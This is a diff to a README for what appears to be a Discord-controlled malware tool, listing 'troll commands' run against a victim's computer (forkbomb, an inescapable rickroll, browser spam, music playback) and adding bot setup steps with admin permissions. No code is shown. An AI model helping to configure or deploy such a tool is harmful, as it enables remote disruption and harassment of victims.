@@ -97,12 +97,23 @@ Malware Commands
 ------------------------------------------------------------------------------------------
 
 Troll Commands:
-  
-  .furryporn <session>: this spams furry porn browsers on victims browser to flood their history
-  .fork <session>: forkbombs their computer using simple batch script
-  .rickroll <session>: rickrolls their computer for 30 seconds and they cannot escape
+  .rickroll <session>: rickrolls them for 30 seconds and they cannot escape
   .music <session> <file_attachment>: plays music on their computer
   .bluescreen <session>: COMING SOON
 
 ------------------------------------------------------------------------------------------
 ```
+
+# How to setup bot
+
+go to https://discord.com/developers/applications and sign in 
+
+once you make your bot go to applications where your bot is and click on the bot then click bot settings
+
+CHECK THESE OPTIONS 
+![help](https://cdn.discordapp.com/attachments/1113445608691335181/1114385999766749184/image.png)
+
+next after thats done go to oauth and click bot then admin and scroll down and copy the link
+
+go to bot settings again and reset token and get it
+
